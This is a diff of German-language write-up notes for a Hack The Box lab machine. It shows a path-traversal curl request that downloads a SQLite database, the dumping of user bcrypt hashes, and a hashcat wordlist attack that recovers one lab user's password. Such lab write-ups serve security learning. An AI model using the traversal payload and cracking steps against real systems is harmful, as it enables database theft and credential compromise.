@@ -1,6 +1,6 @@
 # DB Access
 
-## Vorgehen
+## Vorgehen um die Daten zu bekommen
 
 1. ```/config/database.yml```
     - Infos über die DB + die storage file
@@ -12,22 +12,24 @@
 2. ```/storage/development.sqlite3```
    - Wenn über Burp angefragt, dann bekommt man nur die binary ```.sqlite3``` Datei
 
-![sqlite-binary.png](../../scanning/sqlite-binary.png)
+![sqlite-binary.png](../../../img/sqlite-binary.png)
 
 3. Mit ```curl``` die Datei in geeignetem Format herunterladen
 
-![development-db.png](../../scanning/development-db.png)
+![development-db.png](../../../img/development-db.png)
 ```
 curl    -X GET "http://api.heal.htb/download?filename=../../storage/development.sqlite3" 
         -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE" 
         -o development-db.csv
 ```
 ### DB Structure
-![db-structure.png](db-structure.png)
+![db-structure.png](../../../img/db-structure.png)
 
 ### DB Users
-![img_1.png](user-db.png)
+- Alle User aus der DB bekommen
+- Passwort Hashes bekommen
 
+![img_1.png](../../../img/user-db.png)
 ```
 [
   {
@@ -121,5 +123,49 @@ curl    -X GET "http://api.heal.htb/download?filename=../../storage/development.
     "is_admin": 0
   }
 ]
+```
+---
+
+### Hash rausfinden
+Jetzt habe ich die Hash Werte der User Passwörter 
+=> Muss herausfinden welcher Hashalgorithmus verwendet wurde um die Passwörter zu hashen
+- Interessante Passwörter:
+  - ralph@heal.htb:  ```$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG```
+  - antony@heal.htb: ```$2a$12$fUwM7TOxJ3o3dXL446L99eQhpCTJmx/d43l0pnzIecV.zLBrlP.8i```
+
+#### 1. hash-identifier
+- Liefert mir kein Ergebnis
+
+![img.png](../../../img/hash-identifier.png)
+
+#### 2. hashid
+- Sagt, dass der verwendete Hashalgorithmus einer der Drei ist:
+  1. Blowfish(OpenBSD)
+  2. Woltlab Burning Board 4.x
+  3. bcrypt
+
+![img.png](../../../img/hashid.png)
+---
+
+#### 3. Hashcat
+
+![img.png](../../../img/hashcat.png)
+```
+hashcat -m 3200 
+        pw-hashes.txt 
+        /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+```
+```
+hashcat 
+        -m specify hashtype (3200 = bcrypt, Blowfish(OpenBSD))
+        hash values to crack
+        wordlist
+```
+
+![img.png](../../../img/hashcat-password-antony.png)
+```
+ralph@heal.htb:
+Hash:       $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
+Password:   147258369
 ```
 ---
